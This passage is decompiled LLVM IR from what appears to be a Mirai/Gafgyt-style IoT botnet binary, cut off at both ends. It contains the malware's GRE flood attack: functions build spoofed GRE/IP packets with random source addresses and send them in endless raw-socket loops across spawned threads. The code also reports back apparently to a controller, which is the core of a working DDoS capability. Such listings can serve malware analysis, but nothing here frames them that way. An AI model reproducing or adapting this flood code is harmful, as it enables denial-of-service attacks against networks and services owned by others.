  store i32 268457320, i32* @lr, align 4
  %v2_10005564 = call i32 @realrand(i32 1, i32 255)
  store i32 268457336, i32* @lr, align 4
  %v2_10005574 = call i32 @realrand(i32 1, i32 255)
  store i32 268457352, i32* @lr, align 4
  %v2_10005584 = call i32 @realrand(i32 1, i32 255)
  store i32 268457368, i32* @lr, align 4
  %v2_10005594 = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004ed64.279 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32* @r5, align 4
  %v0_100055b0 = load i32, i32* @r29, align 4
  %v0_100055b4 = load i32, i32* @r28, align 4
  %v0_100055b8 = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100055c8.280 to i32), i32* @lr, align 4
  %v9_100055c4 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004ed64.279 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32 %v0_100055b0, i32 %v0_100055b4, i32 %v0_100055b8, i32 %v2_10005594, i32 ptrtoint (i32* @0 to i32))
  store i32 268457428, i32* @lr, align 4
  %v2_100055d0 = call i32 @realrand(i32 1, i32 255)
  store i32 268457444, i32* @lr, align 4
  %v2_100055e0 = call i32 @realrand(i32 1, i32 255)
  store i32 268457460, i32* @lr, align 4
  %v2_100055f0 = call i32 @realrand(i32 1, i32 255)
  store i32 268457476, i32* @lr, align 4
  %v2_10005600 = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004ed8c.281 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32* @r5, align 4
  %v0_1000561c = load i32, i32* @r29, align 4
  %v0_10005620 = load i32, i32* @r28, align 4
  %v0_10005624 = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005634.282 to i32), i32* @lr, align 4
  %v9_10005630 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004ed8c.281 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32 %v0_1000561c, i32 %v0_10005620, i32 %v0_10005624, i32 %v2_10005600, i32 ptrtoint (i32* @0 to i32))
  store i32 73, i32* @r3, align 4
  %v1_10005638 = call i32 @htons(i32 73)
  %sext = mul i32 %v1_10005638, 65536
  %v1_1000563c = sdiv i32 %sext, 65536
  %v1_10005644 = trunc i32 %v1_1000563c to i16
  store i16 %v1_10005644, i16* inttoptr (i32 3 to i16*), align 2
  store i32 65535, i32* @r3, align 4
  %v1_10005650 = call i32 @htons(i32 65535)
  %v1_1000565c = trunc i32 %v1_10005650 to i16
  store i16 %v1_1000565c, i16* inttoptr (i32 5 to i16*), align 2
  store i8 64, i8* inttoptr (i32 9 to i8*), align 1
  store i32 16384, i32* @r3, align 4
  %v1_10005670 = call i32 @htons(i32 16384)
  %v1_1000567c = trunc i32 %v1_10005670 to i16
  store i16 %v1_1000567c, i16* inttoptr (i32 7 to i16*), align 2
  store i8 47, i8* inttoptr (i32 10 to i8*), align 2
  store i32 268457624, i32* @lr, align 4
  %v1_10005694 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004ed78.274 to i32))
  store i32 %v1_10005694, i32* inttoptr (i32 13 to i32*), align 4
  store i32 268457648, i32* @lr, align 4
  %v1_100056ac = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004dc50.277 to i32))
  store i32 %v1_100056ac, i32* inttoptr (i32 17 to i32*), align 4
  %v3_100056c0 = load i32, i32* @global_var_100451a8.273, align 4
  store i32 2, i32* @r3, align 4
  %v1_100056c8 = call i32 @htons(i32 2)
  %sext3 = mul i32 %v1_100056c8, 65536
  %v1_100056cc = sdiv i32 %sext3, 65536
  %v1_100056d0 = trunc i32 %v1_100056cc to i16
  %v3_100056d0 = add i32 %v3_100056c0, 2
  %v4_100056d0 = inttoptr i32 %v3_100056d0 to i16*
  store i16 %v1_100056d0, i16* %v4_100056d0, align 2
  %v1_100056e0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100056e0, i32* inttoptr (i32 25 to i32*), align 4
  %v1_100056f4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_100056f4, i32* inttoptr (i32 25 to i32*), align 4
  store i8 0, i8* inttoptr (i32 26 to i8*), align 2
  store i32 540, i32* @r3, align 4
  %v1_1000570c = call i32 @htons(i32 540)
  %sext4 = mul i32 %v1_1000570c, 65536
  %v1_10005710 = sdiv i32 %sext4, 65536
  %v1_10005718 = trunc i32 %v1_10005710 to i16
  store i16 %v1_10005718, i16* inttoptr (i32 27 to i16*), align 2
  store i32 0, i32* @r3, align 4
  %v1_10005720 = call i32 @htons(i32 0)
  %v1_1000572c = trunc i32 %v1_10005720 to i16
  store i16 %v1_1000572c, i16* inttoptr (i32 29 to i16*), align 2
  store i8 64, i8* inttoptr (i32 33 to i8*), align 1
  store i32 16384, i32* @r3, align 4
  %v1_10005740 = call i32 @htons(i32 16384)
  %v1_1000574c = trunc i32 %v1_10005740 to i16
  store i16 %v1_1000574c, i16* inttoptr (i32 31 to i16*), align 2
  store i8 17, i8* inttoptr (i32 34 to i8*), align 2
  store i32 268457832, i32* @lr, align 4
  %v1_10005764 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004ed64.279 to i32))
  store i32 %v1_10005764, i32* inttoptr (i32 37 to i32*), align 4
  store i32 268457856, i32* @lr, align 4
  %v1_1000577c = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004ed8c.281 to i32))
  store i32 %v1_1000577c, i32* inttoptr (i32 41 to i32*), align 4
  ret i32 %v1_1000577c

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1004ed8c.281 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ed64.279 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004dc50.277 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ed78.274 to i32), { 1, 0, 2 }
}

define i32 @setup_gre_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 268457944, i32* @lr, align 4
  %v2_100057d4 = call i32 @realrand(i32 1, i32 99999)
  %v1_100057dc = urem i32 %v2_100057d4, 65536
  store i32 %v1_100057dc, i32* @r3, align 4
  %v1_100057e4 = call i32 @htons(i32 %v1_100057dc)
  %sext = mul i32 %v1_100057e4, 65536
  %v1_100057e8 = sdiv i32 %sext, 65536
  %v1_100057f0 = trunc i32 %v1_100057e8 to i16
  store i16 %v1_100057f0, i16* %arg1, align 2
  store i32 268457984, i32* @lr, align 4
  %v2_100057fc = call i32 @realrand(i32 1, i32 255)
  %v1_10005804 = urem i32 %v2_100057fc, 65536
  store i32 %v1_10005804, i32* @r3, align 4
  %v1_1000580c = call i32 @htons(i32 %v1_10005804)
  %v1_10005818 = trunc i32 %v1_1000580c to i16
  %v3_10005818 = add i32 %tmp, 2
  %v4_10005818 = inttoptr i32 %v3_10005818 to i16*
  store i16 %v1_10005818, i16* %v4_10005818, align 2
  %v3_10005824 = add i32 %tmp, 6
  %v4_10005824 = inttoptr i32 %v3_10005824 to i16*
  store i16 0, i16* %v4_10005824, align 2
  %v1_1000582c = add i32 %tmp, 8
  %v2_1000583c = inttoptr i32 %v1_1000582c to i32*
  store i32 -1, i32* %v2_1000583c, align 4
  %v1_10005844 = add i32 %tmp, 12
  %v3_10005850 = inttoptr i32 %v1_10005844 to i16*
  store i16 2816, i16* %v3_10005850, align 2
  store i32 520, i32* @r3, align 4
  %v1_10005858 = call i32 @htons(i32 520)
  %v2_10005858 = trunc i32 %v1_10005858 to i16
  %v3_10005864 = add i32 %tmp, 4
  %v4_10005864 = inttoptr i32 %v3_10005864 to i16*
  store i16 %v2_10005858, i16* %v4_10005864, align 2
  ret i32 %v1_10005858

; uselistorder directives
  uselistorder i32 %v1_10005804, { 1, 0 }
  uselistorder i32 %v1_100057dc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
}

define i32 @greflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_100058a4 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_100058b0 = add i32 %v2_100058a4, 20
  %v1_100058bc = add i32 %arg1, 8
  %v2_100058bc = inttoptr i32 %v1_100058bc to i32*
  %v3_100058bc = load i32, i32* %v2_100058bc, align 4
  %v1_100058c0 = add i32 %arg1, 12
  %v2_100058c0 = inttoptr i32 %v1_100058c0 to i32*
  %v3_100058c0 = load i32, i32* %v2_100058c0, align 4
  store i32 %v3_100058bc, i32* %stack_var_-48, align 4
  store i32 268458220, i32* @lr, align 4
  %v3_100058e8 = call i32 @socket(i32 2, i32 3, i32 17)
  %tmp23 = icmp sgt i32 %v3_100058e8, -1
  br i1 %tmp23, label %dec_label_pc_10005908, label %dec_label_pc_10005900

dec_label_pc_10005900:                            ; preds = %entry
  %v0_10005904 = call i32 @__GI_exit()
  br label %dec_label_pc_10005908

dec_label_pc_10005908:                            ; preds = %entry, %dec_label_pc_10005900
  store i32 %v2_100058a4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268458284, i32* @lr, align 4
  %v0_10005928 = call i32 @__GI_memset()
  %v2_10005930 = call i32 @setup_gre_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268458300, i32* @lr, align 4
  %v1_10005938 = inttoptr i32 %v1_100058b0 to i16*
  %v2_10005938 = call i32 @setup_gre_header(i16* %v1_10005938)
  %v2_10005944 = add i32 %v2_100058a4, 16
  %v3_10005944 = inttoptr i32 %v2_10005944 to i32*
  store i32 %v3_100058c0, i32* %v3_10005944, align 4
  %v1_10005950 = or i32 %v2_100058a4, 2
  %v2_10005950 = inttoptr i32 %v1_10005950 to i16*
  %v3_10005950 = load i16, i16* %v2_10005950, align 2
  %v4_10005950 = zext i16 %v3_10005950 to i32
  %v2_10005960 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10005960 = call i32 @csum(i16* %v2_10005960, i32 %v4_10005950)
  %v1_1000596c = trunc i32 %v3_10005960 to i16
  %v3_1000596c = add i32 %v2_100058a4, 10
  %v4_1000596c = inttoptr i32 %v3_1000596c to i16*
  store i16 %v1_1000596c, i16* %v4_1000596c, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_10005978 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268458392, i32* @lr, align 4
  %v5_10005994 = call i32 @__GI_setsockopt(i32 %v3_100058e8, i32 0, i32 3, i32 %v2_10005978, i32 4)
  %tmp24 = icmp sgt i32 %v5_10005994, -1
  br i1 %tmp24, label %dec_label_pc_100059ac, label %dec_label_pc_100059a4

dec_label_pc_100059a4:                            ; preds = %dec_label_pc_10005908
  %v0_100059a8 = call i32 @__GI_exit()
  br label %dec_label_pc_100059ac

dec_label_pc_100059ac:                            ; preds = %dec_label_pc_10005908, %dec_label_pc_100059a4
  store i32 268458420, i32* @lr, align 4
  %v1_100059b0 = call i32 @__GI_time(i32 0)
  %v1_100059bc = call i32 @init_rand(i32 %v1_100059b0)
  %v2_100059d8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10005a54 = add i32 %v2_100058a4, 12
  %v3_10005a54 = inttoptr i32 %v2_10005a54 to i32*
  %v3_10005a74 = add i32 %v2_100058a4, 4
  %v4_10005a74 = inttoptr i32 %v3_10005a74 to i16*
  br label %dec_label_pc_100059c8

dec_label_pc_100059c8:                            ; preds = %dec_label_pc_10005ae0, %dec_label_pc_100059ac
  %storemerge2 = phi i32 [ 0, %dec_label_pc_100059ac ], [ %v1_10005ae4, %dec_label_pc_10005ae0 ]
  %v3_100059cc = load i16, i16* %v2_10005950, align 2
  %v4_100059cc = zext i16 %v3_100059cc to i32
  store i32 268458492, i32* @lr, align 4
  %v6_100059f8 = call i32 @sendto(i32 %v3_100058e8, i32 %v2_100058a4, i32 %v4_100059cc, i32 0, i32 %v2_100059d8, i32 16)
  %v0_100059fc = call i32 @rand_cmwc()
  %v1_10005a04 = urem i32 %v0_100059fc, 16777216
  %v1_10005a0c = sub i32 %v0_100059fc, %v1_10005a04
  %v0_10005a10 = call i32 @rand_cmwc()
  %v1_10005a1c = and i32 %v0_10005a10, 16711680
  %v2_10005a24 = or i32 %v1_10005a0c, %v1_10005a1c
  %v0_10005a28 = call i32 @rand_cmwc()
  %v1_10005a34 = and i32 %v0_10005a28, 65280
  %v2_10005a3c = or i32 %v2_10005a24, %v1_10005a34
  %v0_10005a40 = call i32 @rand_cmwc()
  %v1_10005a48 = urem i32 %v0_10005a40, 256
  %v2_10005a4c = or i32 %v2_10005a3c, %v1_10005a48
  store i32 %v2_10005a4c, i32* %v3_10005a54, align 4
  %v0_10005a58 = call i32 @rand_cmwc()
  store i32 %v0_10005a58, i32* @r3, align 4
  %v1_10005a64 = call i32 @htonl(i32 %v0_10005a58)
  %v1_10005a74 = trunc i32 %v1_10005a64 to i16
  store i16 %v1_10005a74, i16* %v4_10005a74, align 4
  %v3_10005a80 = load i16, i16* %v2_10005950, align 2
  %v4_10005a80 = zext i16 %v3_10005a80 to i32
  %v3_10005a90 = call i32 @csum(i16* %v2_10005960, i32 %v4_10005a80)
  %v1_10005a9c = trunc i32 %v3_10005a90 to i16
  store i16 %v1_10005a9c, i16* %v4_1000596c, align 2
  %v3_10005aa4 = load i32, i32* @global_var_1004518c.119, align 4
  %v1_10005aa8 = add i32 %v3_10005aa4, 1
  store i32 %v1_10005aa8, i32* @global_var_1004518c.119, align 4
  %v3_10005ab8 = load i32, i32* @global_var_10045174.120, align 4
  %v3_10005ac0 = icmp ugt i32 %v3_10005ab8, %storemerge2
  br i1 %v3_10005ac0, label %dec_label_pc_10005ae0, label %dec_label_pc_10005ac8

dec_label_pc_10005ac8:                            ; preds = %dec_label_pc_100059c8
  %v3_10005ad4 = load i32, i32* @global_var_100450b4.121, align 4
  store i32 268458720, i32* @lr, align 4
  %v1_10005adc = call i32 @usleep(i32 %v3_10005ad4)
  br label %dec_label_pc_10005ae0

dec_label_pc_10005ae0:                            ; preds = %dec_label_pc_100059c8, %dec_label_pc_10005ac8
  %stack_var_-20.0 = phi i32 [ %storemerge2, %dec_label_pc_100059c8 ], [ 0, %dec_label_pc_10005ac8 ]
  %v1_10005ae4 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_100059c8

; uselistorder directives
  uselistorder i32 %v2_100058a4, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005ae0, { 1, 0 }
  uselistorder label %dec_label_pc_100059ac, { 1, 0 }
  uselistorder label %dec_label_pc_10005908, { 1, 0 }
}

define i32 @sendTheGre(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005af0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005af0, i32* %stack_var_-112, align 4
  %v5_10005af0 = ptrtoint i32* %stack_var_-112 to i32
  store i32 268458788, i32* @lr, align 4
  %v1_10005b20 = call i32 @__GI_time(i32 0)
  %v1_10005b30 = call i32 @mfork(i32 %arg2)
  %v3_10005b38 = icmp eq i32 %v1_10005b30, 0
  br i1 %v3_10005b38, label %dec_label_pc_10005b40, label %dec_label_pc_10005f34

dec_label_pc_10005b40:                            ; preds = %entry
  store i32 268458832, i32* @lr, align 4
  %v3_10005b4c = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp33 = icmp sgt i32 %v3_10005b4c, -1
  br i1 %tmp33, label %dec_label_pc_10005b6c, label %dec_label_pc_10005b64

dec_label_pc_10005b64:                            ; preds = %dec_label_pc_10005b40
  %v0_10005b68 = call i32 @__GI_exit()
  br label %dec_label_pc_10005b6c

dec_label_pc_10005b6c:                            ; preds = %dec_label_pc_10005b40, %dec_label_pc_10005b64
  %v2_10005b70 = icmp sgt i32 %arg3, 4
  br i1 %v2_10005b70, label %dec_label_pc_10005b98, label %dec_label_pc_10005b78

dec_label_pc_10005b78:                            ; preds = %dec_label_pc_10005b6c
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10005b8c = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_1002abf8.285 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10005b94 = call i32 @__GI_exit()
  br label %dec_label_pc_10005b98

dec_label_pc_10005b98:                            ; preds = %dec_label_pc_10005b6c, %dec_label_pc_10005b78
  %v1_10005b9c = add i32 %arg4, 12
  store i32 %v1_10005b9c, i32* %r9.global-to-local, align 4
  %v1_10005ba0 = inttoptr i32 %v1_10005b9c to i32*
  %v2_10005ba0 = load i32, i32* %v1_10005ba0, align 4
  store i32 268458924, i32* @lr, align 4
  %v1_10005ba8 = call i32 @atol(i32 %v2_10005ba0)
  %v1_10005bb8 = add i32 %arg4, 16
  store i32 %v1_10005bb8, i32* %r9.global-to-local, align 4
  %v1_10005bbc = inttoptr i32 %v1_10005bb8 to i32*
  %v2_10005bbc = load i32, i32* %v1_10005bbc, align 4
  store i32 268458952, i32* @lr, align 4
  %v1_10005bc4 = call i32 @atol(i32 %v2_10005bbc)
  %v1_10005bd4 = add i32 %arg4, 8
  store i32 %v1_10005bd4, i32* %r9.global-to-local, align 4
  %v1_10005bd8 = inttoptr i32 %v1_10005bd4 to i32*
  %v2_10005bd8 = load i32, i32* %v1_10005bd8, align 4
  store i32 268458980, i32* @lr, align 4
  %v1_10005be0 = call i32 @atol(i32 %v2_10005bd8)
  %v1_10005bf0 = add i32 %arg4, 20
  store i32 %v1_10005bf0, i32* %r9.global-to-local, align 4
  %v1_10005bf4 = inttoptr i32 %v1_10005bf0 to i32*
  %v2_10005bf4 = load i32, i32* %v1_10005bf4, align 4
  store i32 268459008, i32* @lr, align 4
  %v1_10005bfc = call i32 @atol(i32 %v2_10005bf4)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  %v1_10005c24 = mul i32 %v1_10005ba8, 4
  %v1_10005c2c = add i32 %v1_10005c24, 30
  %v1_10005c30 = and i32 %v1_10005c2c, -16
  %v2_10005c38 = load i32, i32* %stack_var_-112, align 4
  %v1_10005c40 = load i32, i32* @r1, align 4
  %v3_10005c40 = sub i32 %v1_10005c40, %v1_10005c30
  %v4_10005c40 = inttoptr i32 %v3_10005c40 to i32*
  store i32 %v2_10005c38, i32* %v4_10005c40, align 4
  %v1_10005c50 = add i32 %v3_10005c40, 23
  %v1_10005c54 = and i32 %v1_10005c50, -16
  store i32 %v1_10005c54, i32* %r9.global-to-local, align 4
  %v1_10005c74 = urem i32 %v1_10005be0, 65536
  store i32 %v1_10005c74, i32* @r3, align 4
  %v1_10005c7c = call i32 @htons(i32 %v1_10005c74)
  %v1_10005c8c = add i32 %arg4, 4
  store i32 %v1_10005c8c, i32* %r9.global-to-local, align 4
  %v1_10005c90 = inttoptr i32 %v1_10005c8c to i32*
  %v2_10005c90 = load i32, i32* %v1_10005c90, align 4
  store i32 268459164, i32* @lr, align 4
  %v1_10005c98 = call i32 @inet_addr(i32 %v2_10005c90)
  %v1_10005ca8 = mul i32 %v1_10005ba8, 24
  %v1_10005cac = add i32 %v1_10005ca8, 15
  store i32 %v1_10005cac, i32* %r9.global-to-local, align 4
  %v1_10005cb0 = add i32 %v1_10005ca8, 30
  %v1_10005cb4 = and i32 %v1_10005cb0, -16
  %v0_10005cbc = load i32, i32* @r1, align 4
  %v1_10005cbc = inttoptr i32 %v0_10005cbc to i32*
  %v2_10005cbc = load i32, i32* %v1_10005cbc, align 4
  %v3_10005cc4 = sub i32 %v0_10005cbc, %v1_10005cb4
  %v4_10005cc4 = inttoptr i32 %v3_10005cc4 to i32*
  store i32 %v2_10005cbc, i32* %v4_10005cc4, align 4
  %v1_10005cd4 = add i32 %v3_10005cc4, 23
  %v1_10005cd8 = and i32 %v1_10005cd4, -16
  store i32 %v1_10005ba8, i32* %r9.global-to-local, align 4
  %v2_10005db02 = icmp sgt i32 %v1_10005ba8, 0
  br i1 %v2_10005db02, label %dec_label_pc_10005d00, label %dec_label_pc_10005db8

dec_label_pc_10005d00:                            ; preds = %dec_label_pc_10005b98, %dec_label_pc_10005d00
  %storemerge15 = phi i32 [ %v1_10005da0, %dec_label_pc_10005d00 ], [ 0, %dec_label_pc_10005b98 ]
  %v1_10005d08 = mul i32 %storemerge15, 24
  %v2_10005d0c = add i32 %v1_10005d08, %v1_10005cd8
  %v2_10005d14 = inttoptr i32 %v2_10005d0c to i32*
  store i32 %storemerge15, i32* %v2_10005d14, align 8
  store i32 %v2_10005d0c, i32* %r9.global-to-local, align 4
  store i32 %v1_10005c98, i32* %r11.global-to-local, align 4
  store i32 %tmp7, i32* @r8, align 4
  %v2_10005d38 = add i32 %v2_10005d0c, 8
  %v3_10005d38 = inttoptr i32 %v2_10005d38 to i32*
  store i32 2, i32* %v3_10005d38, align 8
  %v0_10005d3c = load i32, i32* %r11.global-to-local, align 4
  %v1_10005d3c = load i32, i32* %r9.global-to-local, align 4
  %v2_10005d3c = add i32 %v1_10005d3c, 12
  %v3_10005d3c = inttoptr i32 %v2_10005d3c to i32*
  store i32 %v0_10005d3c, i32* %v3_10005d3c, align 4
  %v0_10005d40 = load i32, i32* @r10, align 4
  %v1_10005d40 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005d40 = add i32 %v1_10005d40, 16
  %v3_10005d40 = inttoptr i32 %v2_10005d40 to i32*
  store i32 %v0_10005d40, i32* %v3_10005d40, align 4
  %v1_10005d44 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005d44 = add i32 %v1_10005d44, 20
  %v3_10005d44 = inttoptr i32 %v2_10005d44 to i32*
  store i32 %tmp7, i32* %v3_10005d44, align 4
  %v1_10005d58 = or i32 %v2_10005d0c, 4
  %v2_10005d60 = inttoptr i32 %v1_10005d58 to i32*
  store i32 %v1_10005be0, i32* %v2_10005d60, align 4
  %v1_10005d6c = mul i32 %storemerge15, 4
  %v2_10005d70 = add i32 %v1_10005d6c, %v1_10005c54
  store i32 %v2_10005d70, i32* %r11.global-to-local, align 4
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 268459420, i32* @lr, align 4
  %v6_10005d98 = inttoptr i32 %v2_10005d70 to i32*
  %v7_10005d98 = call i32 @pthread_create(i32* %v6_10005d98, i32 0, i32 268458112, i32 %v2_10005d0c, i32 %tmp7, i32 268435456)
  %v1_10005da0 = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_10005ba8, i32* %r9.global-to-local, align 4
  %v2_10005db0 = icmp slt i32 %v1_10005da0, %v1_10005ba8
  br i1 %v2_10005db0, label %dec_label_pc_10005d00, label %dec_label_pc_10005db8

dec_label_pc_10005db8:                            ; preds = %dec_label_pc_10005d00, %dec_label_pc_10005b98
  store i32 %v1_10005c8c, i32* %r9.global-to-local, align 4
  %v2_10005dc0 = load i32, i32* %v1_10005c90, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10005ddc = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002ac60.286 to i32), i32 %arg2, i32 %v2_10005dc0)
  store i32 %v1_10005bb8, i32* %r9.global-to-local, align 4
  %v2_10005df0 = load i32, i32* %v1_10005bbc, align 4
  store i32 268459516, i32* @lr, align 4
  %v1_10005df8 = call i32 @atol(i32 %v2_10005df0)
  %v2_10005e04 = mul i32 %v1_10005df8, 20
  store i32 %v2_10005e04, i32* %r9.global-to-local, align 4
  %v3_10005e0c = icmp sgt i32 %v2_10005e04, 0
  br i1 %v3_10005e0c, label %dec_label_pc_10005e14, label %dec_label_pc_10005f2c

dec_label_pc_10005e14:                            ; preds = %dec_label_pc_10005db8
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268459564, i32* @lr, align 4
  %v1_10005e28 = call i32 @usleep(i32 50000)
  %v3_10005e30 = load i32, i32* @global_var_1004518c.119, align 4
  %v2_10005e38 = mul i32 %v3_10005e30, 20
  %v3_10005e40 = icmp ugt i32 %v2_10005e38, %v1_10005bc4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10005e4c = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_10005e40, label %dec_label_pc_10005e48, label %dec_label_pc_10005e88

dec_label_pc_10005e48:                            ; preds = %dec_label_pc_10005e14
  %v2_10005e50 = icmp sgt i32 %v3_10005e4c, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10005e50, label %dec_label_pc_10005e70, label %dec_label_pc_10005e58

dec_label_pc_10005e58:                            ; preds = %dec_label_pc_10005e48
  %v3_10005e5c = load i32, i32* @global_var_100450b4.121, align 4
  %v1_10005e60 = add i32 %v3_10005e5c, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005e60, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10005ed0

dec_label_pc_10005e70:                            ; preds = %dec_label_pc_10005e48
  %v1_10005e78 = add i32 %v3_10005e4c, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005e78, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_10005ed0

dec_label_pc_10005e88:                            ; preds = %dec_label_pc_10005e14
  %v1_10005e90 = add i32 %v3_10005e4c, 1
  store i32 %v1_10005e90, i32* @global_var_10045174.120, align 4
  %v3_10005ea0 = load i32, i32* @global_var_100450b4.121, align 4
  %tmp34 = icmp ult i32 %v3_10005ea0, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp34, label %dec_label_pc_10005ec4, label %dec_label_pc_10005eac

dec_label_pc_10005eac:                            ; preds = %dec_label_pc_10005e88
  %v1_10005eb4 = add i32 %v3_10005ea0, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005eb4, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10005ed0

dec_label_pc_10005ec4:                            ; preds = %dec_label_pc_10005e88
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10005ed0

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10005eac, %dec_label_pc_10005e70, %dec_label_pc_10005e58, %dec_label_pc_10005ec4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  %v2_10005f00 = add i32 %v1_10005bfc, %v1_10005b20
  br label %dec_label_pc_10005edc

dec_label_pc_10005edc:                            ; preds = %dec_label_pc_10005f1c, %dec_label_pc_10005ed0
  %stack_var_-100.0 = phi i32 [ %tmp, %dec_label_pc_10005ed0 ], [ %v1_10005f20, %dec_label_pc_10005f1c ]
  %tmp35 = icmp ult i32 %stack_var_-100.0, 100
  br i1 %tmp35, label %dec_label_pc_10005f1c, label %dec_label_pc_10005ee8

dec_label_pc_10005ee8:                            ; preds = %dec_label_pc_10005edc
  store i32 268459760, i32* @lr, align 4
  %v1_10005eec = call i32 @__GI_time(i32 0)
  store i32 %v1_10005eec, i32* %r11.global-to-local, align 4
  store i32 %v1_10005b20, i32* %r9.global-to-local, align 4
  %v2_10005f04 = icmp ult i32 %v1_10005eec, %v2_10005f00
  br i1 %v2_10005f04, label %dec_label_pc_10005f14, label %dec_label_pc_10005f0c

dec_label_pc_10005f0c:                            ; preds = %dec_label_pc_10005ee8
  %v0_10005f10 = call i32 @__GI_exit()
  br label %dec_label_pc_10005f14

dec_label_pc_10005f14:                            ; preds = %dec_label_pc_10005ee8, %dec_label_pc_10005f0c
  br label %dec_label_pc_10005f1c

dec_label_pc_10005f1c:                            ; preds = %dec_label_pc_10005edc, %dec_label_pc_10005f14
  %stack_var_-100.1 = phi i32 [ %stack_var_-100.0, %dec_label_pc_10005edc ], [ 0, %dec_label_pc_10005f14 ]
  store i32 %stack_var_-100.1, i32* %r9.global-to-local, align 4
  %v1_10005f20 = add i32 %stack_var_-100.1, 1
  br label %dec_label_pc_10005edc

dec_label_pc_10005f2c:                            ; preds = %dec_label_pc_10005db8
  %v0_10005f30 = call i32 @__GI_exit()
  br label %dec_label_pc_10005f34

dec_label_pc_10005f34:                            ; preds = %entry, %dec_label_pc_10005f2c
  %v0_10005f58 = phi i32 [ %v1_10005b30, %entry ], [ %v0_10005f30, %dec_label_pc_10005f2c ]
  %v2_10005f34 = load i32, i32* %stack_var_-112, align 4
  store i32 %v5_10005af0, i32* %r9.global-to-local, align 4
  store i32 %v2_10005f34, i32* %r11.global-to-local, align 4
  ret i32 %v0_10005f58

; uselistorder directives
  uselistorder i32 %stack_var_-100.1, { 1, 0 }
  uselistorder i32 %v3_10005e4c, { 1, 0, 2 }
  uselistorder i32 %v1_10005da0, { 1, 0 }
  uselistorder i32 %v2_10005d0c, { 0, 1, 3, 2, 4 }
